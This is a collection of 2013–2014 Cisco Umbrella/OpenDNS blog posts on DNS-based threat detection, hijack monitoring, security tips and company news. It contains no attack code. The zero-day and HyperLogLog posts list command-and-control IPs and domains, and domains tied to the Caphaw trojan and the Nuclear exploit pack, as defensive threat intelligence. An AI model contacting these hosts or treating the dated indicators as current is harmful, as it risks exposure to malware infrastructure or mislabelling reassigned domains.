{"website": "Cisco-Umbrella", "title": "ZeroMQ: Helping us Block Malicious Domains in Real Time", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/zeromq-helping-us-block-malicious-domains", "abstract": "Every day, we process terabytes of data in order to spot malicious domains based on their network features and how they are accessed. Our live dataset comes from two major sources: – The log files of queries sent by users to our resolvers – The log files of queries sent by our resolvers to authoritative servers. In this blog post, we will focus on the latter, highlighting how we use it to block suspicious domains immediately after they show up in our log files. A not-quite-passive DNS database ———————————- Every time a resolver needs to answer a question that it hasn’t seen before, or that is no longer present in the cache, it must recursively query authoritative DNS servers before eventually being able to forward the final response to a client. We are logging every single packet received by our resolvers from authoritative servers. This lets us keep historical data on all the domain names that we received queries for. This kind of database is often referred to as a “Passive DNS database,” but our system works in a different way, and it’s not quite passive. We are not running sensors: the resolvers themselves are directly logging the responses they receive from authoritative servers. Such a database lets us answer questions like, “What are all the IP addresses that example.com has resolved to in the past 90 days?” and, “What are all the domain names that are using ns1.example.com as an authoritative server?” Building the database ——————— Records received from authoritative servers are highly redundant, because the majority of records have a short TTL even though their content doesn’t actually change much. The edns-clientsubnet extension also triggers a new upstream query for each client subnet, even though many different subnets are actually going to share the same response. Removing duplicate records is thus an essential preliminary step to build our DNS database. This step drastically reduces the amount of data to store: on average, out of 241 log records, we actually only store one. We use a Bloom filter in order to remove duplicate records without having to sort them. Hash functions used to build this Bloom filter are created by using SipHash-2-4 with pseudorandomly-generated keys, and the keys are rotated after each batch of data. Thanks to this trick, we can use very small bitmaps without having to worry too much about false positives: if a name is being reported as present in the set while it shouldn’t, it is very unlikely to happen again after a key rotation. Using a secure pseudorandom function also prevents attackers from intentionally triggering false positives. The output of this deduplication filter is eventually stored as Hadoop HDFS files, and finally into HBase for ad-hoc queries. We sequentially run a dozen Hadoop jobs every day on this data in order to compute different reputation scores for IP addresses and domain names. This eventually lets us find domain names that need to be manually reviewed, or, when combined with the output of other models and third-party services, can be automatically blocked. The need for real time processing ——————————— Running algorithms once a day on the data is clearly suboptimal. If nytimes.com DNS records are hijacked, we need to spot this as soon as possible to protect our customers, not the next day. Furthermore, domain names that serve exploits are also typically only in use for a short period of time. We want to block them while they are still active, and as soon as possible, not after the baton has been passed to another domain. Enter ZeroMQ ———— ZeroMQ is a popular, battle-tested message transport protocol and networking library, designed for very low and predictable latency, high throughput, and high reliability. The ZeroMQ library implements, among other things, the traditional pub/sub pattern: a “producer” generates a stream of data that any number of local or remote clients can simultaneously connect to, in order to receive live updates. After the deduplication process, and in addition to storing the output into HDFS and Hadoop, we are now streaming this data to a ZeroMQ socket. This brings a lot of benefits: – Any authorized machine can join and leave the feed, anytime. This allows for instant testing and parallel processing without any setup. Need to quickly look for domain names matching a specific pattern? That can be done directly on a researcher’s laptop. – Security: ZeroMQ supports strong encryption and certificate-based authentication out of the box, thanks to libsodium . – Low CPU impact: a single machine can effortlessly consume our stream of preprocessed authoritative log data. – Low latency: the data is immediately available for consumption. – No API required: all it takes is a host name and a port number. Just connect to the socket, and you will start receiving formatted data. The ZeroMQ protocol is widely used, and there are readily available client libraries for more than 40 programming languages, as well as plugins for common tools like Splunk. As soon as a client connects, it gets a live stream of JSON objects that can be processed right away. {\"name\":\"a60.w22.akamai.net.\",\"owner\":\"w22.akamai.net.\",\"rr\":\"23.59.188.41\",\"server_ip\":\"96.17.144.41\",\"ts\":1380671640,\"ttl\":20,\"type\":\"A\"} {\"name\":\"a60.w22.akamai.net.\",\"owner\":\"w22.akamai.net.\",\"rr\":\"23.59.188.64\",\"server_ip\":\"96.17.144.41\",\"ts\":1380671640,\"ttl\":20,\"type\":\"A\"} {\"name\":\"www.unitedminds.ie.\",\"owner\":\"unitedminds.ie.\",\"rr\":\"81.17.254.44\",\"server_ip\":\"81.17.254.6\",\"ts\":1380671640,\"ttl\":3600,\"type\":\"A\"} {\"name\":\"2-01-2a01-0007.cdx.cedexis.net.\",\"owner\":\"cedexis.net.\",\"rr\":\"ie0101-authconsumer001-1094152544.eu-west-1.elb.amazonaws.com.\",\"server_ip\":\"69.28.180.4\",\"ts\":1380671640,\"ttl\":20,\"type\":\"CNAME\"} {\"name\":\"2-01-2a01-000a.cdx.cedexis.net.\",\"owner\":\"cedexis.net.\",\"rr\":\"us0801asw013.tango.me.\",\"server_ip\":\"69.28.180.4\",\"ts\":1380671640,\"ttl\":20,\"type\":\"CNAME\"} {\"name\":\"www.facebook-fun.com.\",\"owner\":\"facebook-fun.com.\",\"rr\":\"facebook-fun.com.\",\"server_ip\":\"216.69.185.7\",\"ts\":1380671640,\"ttl\":3600,\"type\":\"CNAME\"} {\"name\":\"scs.retail.fidelity.com.\",\"owner\":\"retail.fidelity.com.\",\"rr\":\"155.199.36.26\",\"server_ip\":\"192.223.177.53\",\"ts\":1380671640,\"ttl\":60,\"type\":\"A\"} {\"name\":\"a3.dscg10.akamai.net.\",\"owner\":\"dscg10.akamai.net.\",\"rr\":\"204.2.145.186\",\"server_ip\":\"96.17.144.40\",\"ts\":1380671640,\"ttl\":20,\"type\":\"A\"} {\"name\":\"hiphotos.wshifen.com.\",\"owner\":\"wshifen.com.\",\"rr\":\"185.10.107.162\",\"server_ip\":\"180.76.8.100\",\"ts\":1380671640,\"ttl\":300,\"type\":\"A\"} Building streams out of streams ——————————- A simple use case of this stream is keeping track of new domain names, or rather domain names that we didn’t see traffic for before, or that didn’t resolve to any IP address until now. In order to do so, we once again use Bloom filters that keep track of unique domain names. To provide a sliding window, we simply use a ring buffer of seven Bloom filters, that we are shifting once the most recent filter gets more than one day old, or holds more than 25 million entries. The output of this consumer is another ZeroMQ stream, that we can use to inspect new web sites as soon as they are discovered. In addition to tracking new domain names, we simultaneously run another consumer tracking new (domain name, IP) tuples. Our IP reputation systems ————————- Every day, we run three Hadoop jobs to assign reputation scores to IP addresses. The first is a bayesian average of the number of known malicious domains found on a given IP address. The second is the secure rank score. The third is based on the amount of “disposable” domains that an IP address has been hosting compared to the amount of stable domains seen on the same IP. (We’ll discuss this score in more detail in an upcoming post.) We use these IP reputation systems to build lists of IP addresses that have been serving a lot of domain names, all of them being known as controlled by cybercriminals. Putting the pieces together ————————— Since we already have a stream of new (domain name, IP) tuples, new domain names resolving to one of the highly suspicious IP addresses can be immediately blocked. While the ZeroMQ library itself is fast and provides latency guarantees, the actual producer and consumer code also needs to be equally efficient to process the data at the same rate as it is received. This was a good opportunity to try Rust , a modern programming language by Mozilla Research aiming at being a safe replacement for C++. Minor changes to the ZeroMQ bindings had to be done in order to make them compatible with the latest Rust version. But overall, our experience with Rust has been absolutely amazing. We contributed our changes to the ZeroMQ bindings and open sourced our Bloom Filter implementation on Github. Towards a more real time architecture ——————————————— When it comes to blocking malware, every second counts. A speedy resolution is the only way to limit the number of compromised machines, so models based on stream processing are insanely useful. We are not going to get rid of our pink friend any time soon,but he just got a new buddy.", "date": "2013-10-04"},
{"website": "Cisco-Umbrella", "title": "Top Ten: The Most Important Cyber Security Tips for Your Users", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/top-ten-important-cyber-security-tips-users", "abstract": "National Cyber Security Awareness Month was established to strengthen the weakest point of any security solution: humans. No matter how effective—or expensive—the security tools protecting your network are, there’s no way to predict the damage caused by a single careless user. The war against cyber criminals is fought each time a user decides to click an unfamiliar link or open an attachment—and just a single mistake could be the reason for massive data loss. To help out IT security managers during this Cyber Security Awareness Month, we’ve compiled a list of things your users should be thinking about whenever they’re using the Internet. They’ve probably heard many or all of these tips before, but repetition doesn’t spoil the prayer. If you take security seriously, you’re already using Cisco Umbrella to protect your network from malware, botnets, and other advanced threats. And if you’re smart, you know that there’s no substitute for educating your users. Share this list with your users, this month—and every month. Read our Top Ten Cybersecurity Tips below: Realize that you are an attractive target to hackers. Don’t ever say “It won’t happen to me.” Practice good password management. Use a strong mix of characters, and don’t use the same password for multiple sites. Don’t share your password with others, don’t write it down, and definitely don’t write it on a post-it note attached to your monitor. Never leave your devices unattended. If you need to leave your computer, phone, or tablet for any length of time—no matter how short—lock it up so no one can use it while you’re gone. If you keep sensitive information on a flash drive or external hard drive, make sure to lock it up as well. Always be careful when clicking on attachments or links in email. If it’s unexpected or suspicious for any reason, don’t click on it. Double check the URL of the website the link is pointing to: bad actors will often take advantage of spelling mistakes to direct you to a harmful domain. Think you can spot a phony website? Sensitive browsing, such as banking or shopping, should only be done on a device that belongs to you, on a network that you trust. Whether it’s a friend’s phone, a public computer, or a cafe’s free WiFi—your data could be copied or stolen. Back up your data regularly, and make sure your anti-virus software is always up to date. Be conscientious of what you plug in to your computer. Malware can be spread through infected flash drives, external hard drives, and even smartphones. Watch what you’re sharing on social networks. Criminals can befriend you and easily gain access to a shocking amount of information—where you go to school, where you work, when you’re on vacation—that could help them gain access to more valuable data. Offline, be wary of social engineering, where someone attempts to gain information from you through manipulation. If someone calls or emails you asking for sensitive information, it’s okay to say no. You can always call the company directly to verify credentials before giving out any information. Be sure to monitor your accounts for any suspicious activity. If you see something unfamiliar, it could be a sign that you’ve been compromised.", "date": "2013-10-08"},
{"website": "Cisco-Umbrella", "title": "The google.rw hijack nobody else noticed", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/google-rw-hijack-nobody-else-noticed", "abstract": "In the past few months, we’ve witnessed a sudden increase in the number of compromised domain registrars and registries, allowing hackers to takeover the domains of popular Web sites. Domains such as Twitter, Google, Facebook, The New York Times, and Microsoft have all been victims of name server hijacks where millions of users are redirected to servers under the control of bad actors. Yesterday, we saw evidence of another attack on a Google domain. But we detected it and helped to fix it so quickly, few people even noticed. Because these attacks seem to be gaining in frequency, we built a system to monitor the records large set of popular domain names. We wrote massresolver , a simple tool leveraging libunbound to quickly and securely resolve a massive list of domain names, even with an empty cache. Now, each time an unexpected name server is detected for a domain in the output, an email is sent to our team, and we can immediately take action to protect our users. We don’t provide authoritative DNS services, so we can’t prevent changes to the actual records hosted on name servers, but we can prevent Umbrella users worldwide from being directed to the malicious IPs via our recursive DNS services. Last night, our monitoring system fired up an alert: the google.rw name servers were not Google’s any more. They were served by a free hosting service named 000webhost. We saw the same name servers a couple days ago: these were used by the Syrian Electronic Army when they took control of the .qa (Qatar) zone , and redirected a lot of domains to their own servers in order to spread a political message. Each DNS record has a time-to-live, i.e. the minimum amount of time resolvers should cache it and serve it unmodified to clients before asking for an update. The attackers wanted to take advantage of this: they set up an unusually high time-to-live for the malicious IP. The very same TTL was observed last week during the .qa zone hijack by the Syrian Electronic Army. Can you spot the malicious IP among Google’s legitimate ones? Because the hackers chose a free hosting service that couldn’t keep up with the amount of queries received for google.rw, we couldn’t see if the hackers had posted a message or were serving malware. We did, however, immediately block the related IP addresses. We detected the hijacking less than 5 minutes after the records had been changed and before any of our resolvers had any chance to fetch the malicious records. Around the same time, we tweeted about this event: Stephane Bortzmeyer of the .FR registry immediately saw the tweet and jumped on his phone to contact the .RW registry. 10 minutes later, the .RW registry acknowledged the hack, and restored the original DNS records. In just 10 minutes, this name server hijack against Google was defeated even before the attackers started to brag about their achievement. Thanks to our monitoring systems, and to very reactive friends! These kinds of attacks are very powerful. Even if a Web site is extremely secure, the content that users load also depends on name server records whose security depends on a third-party. Nothing happened to the servers of the targeted companies, but attackers were able to change DNS records so that users accessing these domains were redirected to a totally different set of machines. Furthermore, controlling a domain name also allows attackers to potentially read private email sent to this domain. Every time we notice a major name server hijack, we immediately block the relevant IP addresses, if only to prevent our users from sending emails that would be intercepted by attackers. With our new monitoring tool, we’re making sure that our users will be protected from these hijacks before they have time to notice.", "date": "2013-10-25"},
{"website": "Cisco-Umbrella", "title": "Microsoft Office Zero-day Exploit", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/microsoft-office-zero-day", "abstract": "Windows users on certain versions of Microsoft software are vulnerable to a zero-day exploit discovered yesterday. Microsoft released security advisories and a fix-it-tool to address this vulnerability, and Jaime Blasco of AlienVault ( @jaimeblascob ) quickly released a great analysis with in-depth intelligence on the attack. So far, the attack seems to be a targeted operation. We are only seeing around 25 users on OpenDNS network being affected. We pulled the DNS footprints of the users who requested the CnC server krickmart.com on November 4th and mapped their geo locations. As shown in the map, a majority of the affected users are located in Pakistan. This aligns with Jaime Blasco’s observation that this attack is targeting Pakistanis. Several users were also spotted in the Netherlands, Luxembourg, and Hungary, so we suspect that targets exist outside of Pakistan alone. We urge all Windows users who have installed software listed by Microsoft’s security advisory to check their system for IOC (Indicator of Compromise) information detailed in Jaime Blasco’s analysis. We can also share a quick summary of pDNS analysis of this attack to hopefully shed a bit light for the attack infrastructure analysis. [ “37.0.125.77”, “krickmart.com.”, First_seen: “2013-08-10”, Last_seen: “2013-11-06” ] [ “31.210.96.220”, “maptonote.com.”, First_seen:”2013-08-20″, Last_seen: “2013-11-06” ] [ “31.210.96.213”, “myflatnet.com.”, First_seen:”2013-08-24″, Last_seen: “2013-11-06” ] [ “91.229.78.126”, “lampur.com.”, First_seen:”2013-09-27″, Last_seen: “2013-11-06” ] [ “91.229.78.100”, “lampur.com.”, First_seen: “2013-09-26”, Last_seen: “2013-09-26” ] [ “91.229.78.86”, “lampur.com.”, First_seen: “2013-09-24”, Last_seen: “2013-09-24” ] [ “91.229.78.82”, “lampur.com.”, First_seen: “2013-08-09”, Last_seen: “2013-08-18” ] [ “212.7.219.39”, “appworldstores.com.”, First_seen:”2013-08-25″, “2013-11-06” ] [ “31.210.96.222”, “similerwork.net.”, First_seen:”2013-08-10″, Last_seen: “2013-11-06” ] [ “37.0.124.95”, “intertechsupport.net.”, First_seen:”2013-08-08″, Last_seen: “2013-11-06” ] [ “91.229.78.126”, “lampur.com.”, First_seen:”2013-09-27″, Last_seen: “2013-11-06” ] [ “91.229.78.100”, “lampur.com.”, First_seen:”2013-09-26″, Last_seen: “2013-09-26” ] [ “91.229.78.86”, “lampur.com.”, First_seen:”2013-09-24″, Last_seen: “2013-09-24” ] [ “91.229.78.82”, “lampur.com.”, First_seen:”2013-08-09″, Last_seen: “2013-08-18” ] [ “93.170.128.60”, “twikstore.com.”, First_seen:”2013-10-28″, Last_seen: “2013-11-06” ] CnC servers         Country 37.0.125.77         Russian Federation 37.0.124.106        Russian Federation 31.210.96.220       Turkey 31.210.96.213       Turkey 91.229.78.126       Ukraine 91.229.78.100       Ukraine 91.229.78.86        Ukraine 91.229.78.82        Ukraine 212.7.219.39        Netherlands 31.210.96.222       Turkey 37.0.124.95         Anonymous Proxy 91.229.78.126       Ukraine 91.229.78.100       Ukraine 91.229.78.86        Ukraine 91.229.78.82        Ukraine 93.170.128.60       Czech Republic Here is a list of domains hosted on the above IP addresses: krickmart.com.\nwww.krickmart.com.\nns1.krickmart.com.\nns2.krickmart.com.\nmaptonote.com.\nirc.cetyeri.net.\nwww.maptonote.com.\nns1.maptonote.com.\nns2.maptonote.com.\nmyflatnet.com.\nebayforboots.net.\nns1.myflatnet.com.\nlampur.com.\ndinapigi.co.uk.\nmail.dinapigi.co.uk.\nns2.dinapigi.co.uk.\nwww.dinapigi.co.uk.\nns1.lampur.com.\nns2.lampur.com.\nlampur.com.\nwww.lampur.com.\nappworldstores.com.\nfile-panda.com.\nandroid.play.store.file-panda.com.\nns1.appworldstores.com.\nns1.file-panda.com.\nns2.appworldstores.com.\nns2.file-panda.com.\nsimilerwork.net.\nwww.similerwork.net.\nintertechsupport.net.\nlampur.com.\ndinapigi.co.uk.\nmail.dinapigi.co.uk.\nns2.dinapigi.co.uk.\nwww.dinapigi.co.uk.\nns1.lampur.com.\nns2.lampur.com.\nlampur.com.\nwww.lampur.com.\ntwikstore.com.\nns1.twikstore.com.\nns2.twikstore.com. While hunting down all potential CnC servers, we noticed an interesting similarity of the server configuration across these domains. It might not turn out to be relevant, but this configuration isn’t typically seen compared to the random sample of 50,000 headers we analyzed below. As a result, we conclude that the same attackers are running all the servers in the attack. Server: Apache/2.2.24 (Unix) mod_ssl/2.2.24 OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Accept-Ranges: bytes\nTransfer-Encoding: chunked\nContent-Type: text/html", "date": "2013-11-06"},
{"website": "Cisco-Umbrella", "title": "Delighting the Customer: Introducing the Umbrella Account Management Team", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/delighting-customer-introducing-umbrella-account-management-team", "abstract": "Delighting the customer is a common goal and familiar phrase for all OpenDNS employees. This aim permeates our culture and guides our growth. OpenDNS staff members are often recognized internally for going above and beyond standard job duties with exceptional efforts to delight our customers, whether by troubleshooting a tricky deployment, spinning up a requested feature in under a week, or staying late to field a critical customer call. This focus demonstrates our company-wide emphasis on the importance of serving our users in every department from Engineering to Sales, but there are also several teams for whom delighting the customer falls squarely within daily duties. You may already be familiar with our Technical Support team, but I would like to introduce you to another department whose primary focus is customer success: the Umbrella Account Management team! What are we here for? It is the Account Management team’s mission to ensure the ongoing happiness and success of all Umbrella customers, fostering relationships that flourish for years to come. We are here to serve as customer educators and advocates. We’re also here to provide non-technical support when you need help! Happily, the Umbrella products do a lot of work for us. There are many customers that we hear from just once each year, enthusiastically signing on for their next renewal. The service “just works” for them, and they need little more. We also owe a lot to the Support team, which eagerly assists customers with configuration and technical troubleshooting. Just open a ticket and you’ll hear back in short order! For any other issues that may arise, though, we are your resource! We love it when we get the opportunity to work closely with a customer: answering a question, teaching them something new about our services, or helping to address any concerns. We also keep our ears to the ground for the Product Management and Engineering teams. Customer feedback shapes the development of new features and products, so if you see a way to improve the Umbrella services, let us know! How can we help you? Your OpenDNS Account Manager is the person to ask if you want to access or update your account information. We manage the renewals process from start to finish, and are happy to assist with licensing expansions, reductions, or upgrades. We also process contracts and invoicing for all our customers. Need an update on the status of an invoice? Payment options? Payment history? We can help! Do you need a copy of your contract? Just let us know! We have the answers when it comes to administrative questions, but we can help you with so much more! We are Umbrella product experts, and love to educate our customers about how to get the most value out of our services. We’re happy to get admins up to speed with their Umbrella solutions, whether they’re new to the product or just need a brush up on configuration, features, or best practices. Finally, we are our customers’ conduit to the larger OpenDNS team and close partners in problem solving.  We work with almost every department in the company; if we don’t have the answer to your question offhand, we know how to find it. If you run into difficulties, please reach out for help! We’re always happy to assist you. Keeping in touch So, how can you contact us? If you need help and don’t have your Account Manager’s contact information on file, just send an email to account-management@opendns.com. Your own Account Manager will reach out shortly!", "date": "2013-11-12"},
{"website": "Cisco-Umbrella", "title": "Using HyperLogLog to Detect Malware Faster Than Ever", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/hyperloglog-and-malware-detection", "abstract": "Previously, we introduced our real-time API , and Senior Research Scientist Ping Yan recently blogged about how she used it to find Black Friday scams . The data feed, described in the post mentioned above, is constantly consumed by multiple processors or stream interpreters. In this blog post, we will focus on one processor dedicated to spotting a specific category of suspicious IP addresses. It is uncommon for an IP address to suddenly have many new domain names map to it, where there was none prior. Of course a hosting service, a load-balancing service, a CDN or a user moving a lot of domains to a new server can follow this pattern, but benign cases are both infrequent and relatively easy to distinguish from suspicious activities. In our research, we define an IP address as being “dormant” if less than N names mapping to it have been observed in the past 7 days, and as “hyperactive” if more than M names mapping to it have been observed during the past 4 hours. One stream we generate is a list of recently observed pairs (name, IP address). This stream is a perfect candidate for our task. {\"asn\":30962,\"name\":\"dentro.de.\",\"owner\":\"dentro.de.\",\"rr\":\"62.108.32.81\",\"server_ip\":\"82.115.108.50\",\"ts\":1386104400,\"ttl\":3600,\"type\":\"A\"}\n{\"asn\":8972,\"name\":\"www.benm.at.\",\"owner\":\"benm.at.\",\"rr\":\"80.86.80.177\",\"server_ip\":\"193.46.215.55\",\"ts\":1386104400,\"ttl\":900,\"type\":\"A\"}\n{\"asn\":25847,\"name\":\"model-trains-store.com.\",\"owner\":\"model-trains-store.com.\",\"rr\":\"64.64.3.139\",\"server_ip\":\"64.64.3.136\",\"ts\":1386104400,\"ttl\":14400,\"type\":\"A\"}\n{\"asn\":8685,\"name\":\"www.engin.tv.\",\"owner\":\"engin.tv.\",\"rr\":\"213.155.113.195\",\"server_ip\":\"212.58.3.7\",\"ts\":1386104400,\"ttl\":600,\"type\":\"A\"}\n{\"asn\":29648,\"name\":\"info-03.surgutneftegas.ru.\",\"owner\":\"surgutneftegas.ru.\",\"rr\":\"77.233.191.6\",\"server_ip\":\"83.149.32.2\",\"ts\":1386104400,\"ttl\":3600,\"type\":\"A\"}\n{\"asn\":20485,\"name\":\"info-03.surgutneftegas.ru.\",\"owner\":\"surgutneftegas.ru.\",\"rr\":\"62.33.202.6\",\"server_ip\":\"83.149.32.2\",\"ts\":1386104400,\"ttl\":3600,\"type\":\"A\"}\n{\"asn\":3462,\"name\":\"36-233-153-101.dynamic-ip.hinet.net.\",\"owner\":\"dynamic-ip.hinet.net.\",\"rr\":\"36.233.153.101\",\"server_ip\":\"168.95.1.19\",\"ts\":1386104400,\"ttl\":86400,\"type\":\"A\"}\n{\"asn\":20773,\"name\":\"www.electronic-thingks.de.\",\"owner\":\"electronic-thingks.de.\",\"rr\":\"83.169.26.138\",\"server_ip\":\"80.237.128.10\",\"ts\":1386104400,\"ttl\":86400,\"type\":\"A\"}\n{\"asn\":9198,\"name\":\"89.218.160.130.metro.online.kz.\",\"owner\":\"metro.online.kz.\",\"rr\":\"89.218.160.130\",\"server_ip\":\"212.19.149.53\",\"ts\":1386104400,\"ttl\":86400,\"type\":\"A\"} However, keeping track of all the names observed for all the IPs observed can require quite a lot of memory, especially when all we need is a bunch of counters. Furthermore, these counters do not have to be accurate. When an IP address becomes “hyperactive,” new names are usually piling up at a very high rate, so the IP will eventually be labeled. Instead of keeping track of individual domain names that mapped to each IP, we use the HyperLogLog algorithm that we ported to the Rust programming language. The beauty of this algorithm is that the complexity and memory usage remain constant no matter how many elements are in the set. Our stream processor keeps an in-memory set of IPs, and for each IP, two HyperLogLog estimators. The former (“current”) estimates the number of names recently observed for a given IP. The latter (“archive”) estimates the number of names observed more than 4 hours ago. When a new entry for an IP is read from the stream, we check the age of the “current” estimator. If this estimator has been in use for more than 4 hours, we merge the content of this estimator to the one dedicated to archival and reset the “current” estimator. Thanks to the HyperLogLog algorithm, merging is a very fast and constant-time operation. In order to detect hyperactive IPs that recently transitioned from being dormant, the stream processor estimates the cardinality of each IP using the “archive” estimator, then the cardinality of the same IP using the “current” estimator. If the former is below N (which we empirically set to 3) and the latter above or equal to M (currently 10), we print the current cardinality, the name and the IP: 88  5fd40.93taotao.com. 23.104.41.152\n52  2l7d9.jjrnp.com.    23.244.38.15\n153 14q3f.wzstorm.com.  23.244.38.77\n107 shishicaizuiyizhongjiangdewanfa.gzhsfisher.com. 23.235.132.36\n71  qo73p.yqhxnhcl.com. 172.246.178.62\n95  mianfeiqipaiyouxipingtai.gzaqgy.com.    23.244.57.126\n136 35441.dlyjzs.com.   23.244.38.85\n46  ppyulechengwangzhandizhishishime.5udate.com.    173.234.231.103\n99  ouzhoubeijuesai.axcych58.com.   23.244.57.92\n45  gongjihuichengyuan.jjkho.com.   5.226.171.35\n12  overlay.ringtonematcher.com.    216.137.55.127\n46  i-mhow.com. 141.101.117.162 Sorting recent entries of this new stream yields domain names mapping to the most hyperactive IPs: 571 sge.su\n    553 sxo.su These domains happen to be currently used by the Caphaw trojan . Filtering by name patterns and TTLs immediately shows more interesting domains (listed below) being used by the Nuclear exploit pack: 81 thinkmetal.biz\n     46 cosmogift.biz\n     37 lightcasa.biz\n     36 movieprice.biz\n     32 moviehello.biz\n     31 timequality.biz\n     31 infoobesity.biz\n     31 comwin.biz\n     30 flypanda.biz\n     26 expertsurvey.biz\n     20 eurosync.biz\n     18 spymac.biz\n     18 sharerebel.biz\n     16 cybervirtual.biz\n     10 drcoupon.biz These domains can be active for a very short period of time, so blocking them as fast as possible is critical. To put all this in context, the OpenDNS Security Graph is centered on the concept of being fast, predictive, and adaptive. We want to block malware and botnets before they even manifest themselves as a problem. The real-time API, and the stream processors built on it, allow us to react very quickly, even before the data is recorded in our databases. Sketching algorithms such as HyperLogLog make that possible on big data, with little effort, little hardware, and low latency.", "date": "2013-12-05"},
{"website": "Cisco-Umbrella", "title": "Where do you see yourself in 5 years?", "author": ["Vinny LaRiza"], "link": "https://umbrella.cisco.com/blog/reflections-on-5-years-at-opendns", "abstract": "I remember thinking to myself when I first started working at OpenDNS, “Man, I am really enjoying this job and this company. It’s gonna be a sad day when I no longer feel like working here anymore.” This was a reference to previous jobs that I had worked – I was 24 years old at the time, and it seemed to be a natural reoccurrence that after I had worked somewhere for awhile, I would just be over it. Tired of what I was doing. Well, it’s been 5 years since my first day of employment at OpenDNS (which is the longest I’ve ever been at any company) and I STILL look forward to coming into work every day. My role at the company has changed a bit since then, and while this is a big part of why I feel this way, it’s not the only reason. This place has always had an incredible company culture. I feel like I’m constantly surrounded by incredibly smart, talented and personable human beings, all of whom work very hard and believe wholeheartedly in the brand. I don’t know if you’ve ever been surrounded by people like this all day long, but it’s a trip. Infectious even. I find myself working harder and better than I ever have, in the name of being excited about where the company is headed, not being the weakest link, and most importantly, not letting my team down. Oh, and you know that jerk at your job that everybody hates having to deal with or talk to? They don’t work here! Our executive team is, not surprisingly, also a great group of people. A respected and respectful group of individuals that constantly lead by example. They aren’t just telling us to run and climb and jump, but are right there running and climbing and jumping with us. Inspiring us to work towards enabling the world to connect to the internet with confidence anytime, anywhere and from any device. I might be drizzling a little too much sugar over my superiors here (not sorry), but these are true facts. Believe it. I could go on about the various fun team building events that are held, or the positive feedback I’ve received every single time I talk to someone outside of the company who has heard or read about us , or the food truck lunches that are provided every week and so on and so forth. Those things are all incredible perks, but when it comes down to it, what makes this such a great place to work is the people that I get to hang out with and work alongside day in and day out. It’s been a fun, productive and gratifying ride watching the company grow from 20 people (sharing an office with 3 other companies) to becoming a company of close to 150 people ( and counting ). There are a few things that have changed, and a few faces that I was sad to see go, but the underlying vibe has remained the same. From my first day of employment all the way up to now, we’ve been a company full of great people with a worldwide presence and a big dream. If things keep on in the direction they’ve been going, I may never get tired of this place.", "date": "2014-01-30"},
{"website": "Cisco-Umbrella", "title": "Evolution of the MSP", "author": ["Dima Kumets"], "link": "https://umbrella.cisco.com/blog/evolution-msp", "abstract": "OpenDNS has been working with Managed Service Providers (MSPs) for almost 5 years. During that time, we’ve seen some pretty profound changes to the industry. MSPs have evolved and adapted in many ways to better suit the market, fueling incredible growth. As a product manager focusing on Umbrella for MSPs, it’s been incredible to help our partners grow and observe the evolution of the MSP. What is an MSP? The commonly accepted meaning of an MSP is an IT service provider that supports its customers on a remote basis and offers an all-you-can-eat billing model.  MSPs leverage Remote Monitoring and Management tools (RMMs) to both remotely support customers and to automate routine tasks through scripting. Professional Services Automation (PSA) tools like ConnectWise and AutoTask emerged to enable MSPs to better manage workflows and optimize their businesses. The combination of PSA and RMM allowed a level of automation and continuous process improvement that has enabled MSPs to disrupt the IT services market. But what does this mean to the customer? The MSP model caught on with customers because it enabled them to have their IT needs taken care of for a flat monthly cost that is easy to budget. The MSP model made customer uptime the MSP’s top concern. As a customer, I don’t care why the computers are down. I just want my employees to be productive. By moving the cost of fixing IT issues from the customer to the MSP, it incentivized MSPs to be proactive, invest time in proper maintenance, and choose the solutions that were best of breed instead of those with highest resale margins. Expanding markets Traditionally, MSPs have focused on SMBs with a particular focus on the 10 to 75 employee customer size. The majority of customers are small businesses like doctor’s offices, law firms, accountants, manufacturing firms and car dealerships. These are businesses that want top notch technology but don’t want the costs or management burdens of hiring full-time IT. MSPs expanded to fill the role of the virtual CIO for SMBs by forecasting IT replacement costs and proposing improvements that could benefit the business.  While most still serve a variety of customers, many MSPs have focused on specific verticals such as healthcare or legal that have very specific IT needs.  However, the more interesting evolution has been in MSPs expanding into the larger end of SMB and even the mid-market with 100 to 750 employee companies. MSPs move to the mid-market Larger SMBs and mid-market organizations often have in-house IT but too often, these departments are stretched thin with heroes working tirelessly to keep their organizations running. In this situation, MSPs act as a force multiplier by extending their automated processes and larger teams to make in-house IT more effective (and let them finally have a weekend off!). In some cases this means having the in-house IT do the face-to-face help desk interactions, such as new employee set ups or troubleshooting, while escalating core service issues up to the MSP. In other cases, this means turning over server management to the MSP while keeping in-house IT to manage the end points and employee needs. While the model still hasn’t been standardized, it’s easy to see that MSPs are moving up-market with strong value props and customer demand. The rise of the cloud At this point nearly everyone has talked about MSPs’ opportunity in the cloud. The evolution we’re seeing is in how MSPs are executing on this opportunity.  It’s not just about offering a choice of Office365 both in-house and cloud-hosted, but about leveraging existing capabilities to offer new services. Application hosting for a wider variety of services, such as ERP and accounting, has given rise to the new breed of service provider that is easier to scale and can better serve a wider variety of customers. It also allows MSPs to practice a land-and-expand strategy of getting a customer through hosted applications and expanding the account to include full off-site managed IT. Another growing market for MSPs is Virtual Desktop Infrastructure or VDI. The MSPs host the virtualized infrastructure and maintain customers’ virtual machines. This means that the end customer remotely connects to their “work computer”. The virtual desktops are hosted right next to applications to improve performance of mission-critical systems. A big benefit of this model is that since the computing happens at the server or data-center, end point hardware performance is now almost irrelevant.  All the data is also hosted remotely and lost or stolen laptops hardly disrupt the business. The challenge with rolling this out in scale is getting enough bandwidth for a larger office. Here in the San Francisco Bay Area, available bandwidth varies significantly based on location. Even more importantly, the cost of bandwidth is incredibly variable based on geography. While VDI would be practical for our office in the South of Market (SoMa) area, it would be cost prohibitive or impossible for an organization over 50 employees just 30 miles away. The viability of this model is ever changing and is one we are watching closely. What’s next? I believe that MSPs will find new opportunity in the shift to a roaming workforce.  Work is no longer a place you go, it’s a thing you do. Workers at organizations of all sizes already take laptops on business trips and home for the weekend. However, for the millennials now entering and soon to be leading in the workforce, the ability to work remotely is a core requirement rather than a privilege. MSPs have perfected the ability to support customers remotely and should be leveraging this expertise to position themselves as the established experts for this emerging market. The next-gen MSP will enable customers to evolve and support the workforce of the future. 